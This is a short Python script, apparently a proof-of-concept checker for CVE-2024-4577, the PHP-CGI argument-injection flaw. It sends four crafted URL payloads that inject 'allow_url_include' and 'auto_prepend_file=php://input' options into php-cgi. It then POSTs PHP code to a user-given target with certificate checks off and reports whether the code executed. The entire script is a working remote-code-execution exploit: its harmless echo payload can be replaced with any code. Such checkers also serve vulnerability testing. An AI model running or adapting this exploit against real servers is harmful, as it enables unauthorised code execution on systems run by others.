import requests
import argparse

payloads = [
    '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',
    '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input',
]

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 -t TARGET""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
args = parser.parse_args()

url = args.target.rstrip('/')
php_code = '<?php echo "1337"; ?>'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

s = requests.Session()
s.verify = False

print("CVE-2024-4577 exploitability test on " + url)

for payload in payloads:
    test = f"{url}{payload}"
    print(f"--> {test}")
    
    try:
        response = s.post(test, headers=headers, data=php_code)
        if('1337' in response.text):
            print('(+) Target is exploitable!')
        else:
            print('(!) Exploitation may have failed')
    except Exception as e:
        print(f"(!) error occured while testing: {e}")
